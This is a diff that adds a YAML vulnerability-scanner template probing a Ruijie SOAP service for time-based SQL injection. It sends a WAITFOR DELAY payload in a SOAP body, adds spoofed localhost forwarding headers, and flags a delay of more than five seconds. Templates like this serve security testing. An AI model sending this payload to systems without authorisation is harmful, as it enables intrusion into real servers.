@@ -1,0 +1,46 @@
+id: time-based-sql-injection-soap
+
+info:
+  name: Time-Based SQL Injection via SOAP
+  author: yingyu
+  severity: high
+  description: Checks for time-based SQL injection vulnerabilities in SOAP services by injecting a WAITFOR DELAY command.
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/selfservice/service/operatorReportorRoamService"
+
+    headers:
+      Pragma: no-cache
+      Cache-Control: no-cache
+      Upgrade-Insecure-Requests: "1"
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+      Accept-Encoding: gzip, deflate, br
+      Accept-Language: zh-CN,zh;q=0.9
+      Cookie: JSESSIONID=E11357F98384E13B3BF445FD78176426
+      x-forwarded-for: 127.0.0.1
+      x-originating-ip: 127.0.0.1
+      x-remote-ip: 127.0.0.1
+      x-remote-addr: 127.0.0.1
+      Connection: close
+      Content-Type: text/xml;charset=UTF-8
+      Content-Length: "355"
+
+    body: |
+      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com">
+        <soapenv:Header/>
+        <soapenv:Body>
+          <ser:queryOperatorUuid>
+            <!--type: string-->
+            <ser:in0>';WAITFOR DELAY '0:0:5'--</ser:in0>
+          </ser:queryOperatorUuid>
+        </soapenv:Body>
+      </soapenv:Envelope>
+
+    matchers:
+      - type: time
+        condition: gt
+        threshold: 5000  # in milliseconds
+        part: total
